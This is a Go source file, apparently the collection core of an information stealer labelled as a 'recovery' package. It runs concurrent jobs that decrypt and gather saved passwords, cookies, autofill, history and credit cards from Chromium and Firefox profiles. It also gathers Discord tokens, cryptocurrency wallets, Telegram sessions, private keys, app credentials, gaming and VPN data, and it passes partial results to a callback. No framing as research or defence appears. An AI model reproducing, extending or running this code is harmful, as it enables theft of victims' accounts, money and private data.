package recovery

import (
	"context"
	"fmt"
	"sync"

	"recovery/recovery/browser"
	"recovery/recovery/chromium"
	"recovery/recovery/crypto"
	"recovery/recovery/discord"
	"recovery/recovery/firefox"
	"recovery/recovery/platform"
	"recovery/recovery/scanner"
	"recovery/recovery/types"
)

func mergeInto(dst, src *types.CollectionResult) {
	dst.Passwords = append(dst.Passwords, src.Passwords...)
	dst.Cookies = append(dst.Cookies, src.Cookies...)
	dst.Autofill = append(dst.Autofill, src.Autofill...)
	dst.History = append(dst.History, src.History...)
	dst.Bookmarks = append(dst.Bookmarks, src.Bookmarks...)
	dst.CreditCards = append(dst.CreditCards, src.CreditCards...)
	dst.DiscordTokens = append(dst.DiscordTokens, src.DiscordTokens...)
	dst.Files = append(dst.Files, src.Files...)
	dst.Wallets = append(dst.Wallets, src.Wallets...)
	dst.Telegram = append(dst.Telegram, src.Telegram...)
	dst.Keys = append(dst.Keys, src.Keys...)
	dst.AppCredentials = append(dst.AppCredentials, src.AppCredentials...)
	if src.Gaming != nil {
		dst.Gaming = src.Gaming
	}
	if src.VPNs != nil {
		dst.VPNs = src.VPNs
	}
	dst.Errors = append(dst.Errors, src.Errors...)
}

func Collect(ctx context.Context, opts types.CollectOptions, partialFn func(*types.CollectionResult)) (*types.CollectionResult, error) {
	result := &types.CollectionResult{}

	platform.ResetHandleCache()
	defer platform.ResetHandleCache()

	platformSetupCollect()
	defer platformTeardownCollect()

	needsBrowserData := opts.Passwords || opts.Cookies || opts.Autofill ||
		opts.History || opts.Bookmarks || opts.CreditCards

	type browserState struct {
		cfg      types.BrowserConfig
		keys     *types.ResolvedKeys
		profiles []types.ProfileInfo
		pids     []uint32
	}

	var states []browserState
	if needsBrowserData {
		for _, cfg := range browser.Browsers {
			profiles := browser.FindProfileDirs(cfg)
			if len(profiles) == 0 {
				continue
			}
			logf("resolving keys for %s (%d profiles)", cfg.Name, len(profiles))
			keys, err := crypto.ResolveKeys(cfg)
			if err != nil {
				result.Errors = append(result.Errors, fmt.Sprintf("%s key resolution: %v", cfg.Name, err))
				logf("%s key resolution failed: %v", cfg.Name, err)
				keys = &types.ResolvedKeys{}
			}
			pids, _ := platform.FindProcesses(cfg.ProcessName)
			states = append(states, browserState{cfg, keys, profiles, pids})
		}
	}

	type job struct {
		cfg     types.BrowserConfig
		keys    *types.ResolvedKeys
		profile types.ProfileInfo
		pids    []uint32
	}

	jobCh := make(chan job, 64)
	var (
		mu sync.Mutex
		wg sync.WaitGroup
	)

	if opts.Discord {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors("discord token extraction", &result.Errors, &mu)
			tokens := discord.ExtractTokens()
			if len(tokens) > 0 {
				mu.Lock()
				result.DiscordTokens = append(result.DiscordTokens, tokens...)
				mu.Unlock()
				if partialFn != nil {
					partialFn(&types.CollectionResult{DiscordTokens: tokens})
				}
			}
		}()
	}

	if opts.Files {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors("file scan", &result.Errors, &mu)
			files := scanner.ScanFiles()
			if len(files) > 0 {
				mu.Lock()
				result.Files = append(result.Files, files...)
				mu.Unlock()
				if partialFn != nil {
					partialFn(&types.CollectionResult{Files: files})
				}
			}
		}()
	}

	if opts.Wallets {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors("wallet scan", &result.Errors, &mu)
			wallets := scanner.ScanWallets()
			if len(wallets) > 0 {
				mu.Lock()
				result.Wallets = append(result.Wallets, wallets...)
				mu.Unlock()
				if partialFn != nil {
					partialFn(&types.CollectionResult{Wallets: wallets})
				}
			}
		}()
	}

	if opts.Telegram {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors("telegram scan", &result.Errors, &mu)
			sessions := scanner.ScanTelegram()
			if len(sessions) > 0 {
				mu.Lock()
				result.Telegram = append(result.Telegram, sessions...)
				mu.Unlock()
				if partialFn != nil {
					partialFn(&types.CollectionResult{Telegram: sessions})
				}
			}
		}()
	}

	if opts.Keys {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors("key scan", &result.Errors, &mu)
			keys := scanner.ScanKeys()
			if len(keys) > 0 {
				mu.Lock()
				result.Keys = append(result.Keys, keys...)
				mu.Unlock()
				if partialFn != nil {
					partialFn(&types.CollectionResult{Keys: keys})
				}
			}
		}()
	}

	if opts.Apps {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors("app credentials scan", &result.Errors, &mu)
			apps := scanner.ScanApps()
			if len(apps) > 0 {
				mu.Lock()
				result.AppCredentials = append(result.AppCredentials, apps...)
				mu.Unlock()
				if partialFn != nil {
					partialFn(&types.CollectionResult{AppCredentials: apps})
				}
			}
		}()
	}

	if opts.Gaming {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors("gaming scan", &result.Errors, &mu)
			gaming := ScanGaming()
			if gaming != nil {
				mu.Lock()
				result.Gaming = gaming
				mu.Unlock()
				if partialFn != nil {
					partialFn(&types.CollectionResult{Gaming: gaming})
				}
			}
		}()
	}

	if opts.VPNs {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors("vpn scan", &result.Errors, &mu)
			vpns := ScanVPNs()
			if vpns != nil {
				mu.Lock()
				result.VPNs = vpns
				mu.Unlock()
				if partialFn != nil {
					partialFn(&types.CollectionResult{VPNs: vpns})
				}
			}
		}()
	}

	const workers = 4
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors("browser profile extraction", &result.Errors, &mu)
			for j := range jobCh {
				select {
				case <-ctx.Done():
					return
				default:
				}
				func() {
					defer recoverErrors(fmt.Sprintf("%s/%s extraction", j.cfg.Name, j.profile.Name), &result.Errors, &mu)
					partial := extractProfileData(ctx, j.cfg, j.keys, j.profile, j.pids, opts)
					mu.Lock()
					mergeInto(result, partial)
					mu.Unlock()
					if partialFn != nil && (len(partial.Passwords) > 0 || len(partial.Cookies) > 0 ||
						len(partial.Autofill) > 0 || len(partial.History) > 0 ||
						len(partial.Bookmarks) > 0 || len(partial.CreditCards) > 0) {
						partialFn(partial)
					}
				}()
			}
		}()
	}

	go func() {
		defer close(jobCh)
		for _, s := range states {
			for _, p := range s.profiles {
				select {
				case jobCh <- job{s.cfg, s.keys, p, s.pids}:
				case <-ctx.Done():
					logf("collection deadline reached; stopping job producer")
					return
				}
			}
		}
	}()

	wg.Wait()

	if err := ctx.Err(); err != nil {
		note := fmt.Sprintf("collection interrupted (%v); results may be incomplete", err)
		result.Errors = append(result.Errors, note)
		logf("%s", note)
	}

	return result, nil
}

func extractProfileData(ctx context.Context, cfg types.BrowserConfig, keys *types.ResolvedKeys, profile types.ProfileInfo, pids []uint32, opts types.CollectOptions) *types.CollectionResult {
	partial := &types.CollectionResult{}
	var (
		wg   sync.WaitGroup
		eMu  sync.Mutex
		errs []string
	)
	label := fmt.Sprintf("%s/%s", cfg.Name, profile.Name)

	if cfg.IsFirefox {
		if opts.Passwords {
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer recoverErrors(label+" password extraction", &errs, &eMu)
				partial.Passwords = firefox.ExtractPasswords(profile, cfg, pids)
			}()
		}
		if opts.Cookies {
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer recoverErrors(label+" cookie extraction", &errs, &eMu)
				partial.Cookies = firefox.ExtractCookies(profile, cfg)
			}()
		}
		if opts.Autofill {
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer recoverErrors(label+" autofill extraction", &errs, &eMu)
				partial.Autofill = firefox.ExtractAutofill(profile, cfg, pids)
			}()
		}
		if opts.History {
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer recoverErrors(label+" history extraction", &errs, &eMu)
				partial.History = firefox.ExtractHistory(profile, cfg)
			}()
		}
		if opts.Bookmarks {
			wg.Add(1)
			go func() {
				defer wg.Done()
				defer recoverErrors(label+" bookmark extraction", &errs, &eMu)
				partial.Bookmarks = firefox.ExtractBookmarks(profile, cfg)
			}()
		}
		wg.Wait()
		partial.Errors = errs
		return partial
	}

	if opts.Passwords {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors(label+" password extraction", &errs, &eMu)
			partial.Passwords = chromium.ExtractPasswords(profile, cfg, keys, pids)
		}()
	}
	if opts.Cookies {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors(label+" cookie extraction", &errs, &eMu)
			partial.Cookies = chromium.ExtractCookies(profile, cfg, keys, pids)
		}()
	}
	if opts.Autofill {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors(label+" autofill extraction", &errs, &eMu)
			partial.Autofill = chromium.ExtractAutofill(profile, cfg, pids)
		}()
	}
	if opts.History {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors(label+" history extraction", &errs, &eMu)
			partial.History = chromium.ExtractHistory(profile, cfg, pids)
		}()
	}
	if opts.Bookmarks {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors(label+" bookmark extraction", &errs, &eMu)
			partial.Bookmarks = chromium.ExtractBookmarks(profile, cfg)
		}()
	}
	if opts.CreditCards {
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer recoverErrors(label+" credit card extraction", &errs, &eMu)
			partial.CreditCards = chromium.ExtractCreditCards(profile, cfg, keys, pids)
		}()
	}
	wg.Wait()
	partial.Errors = errs
	return partial
}
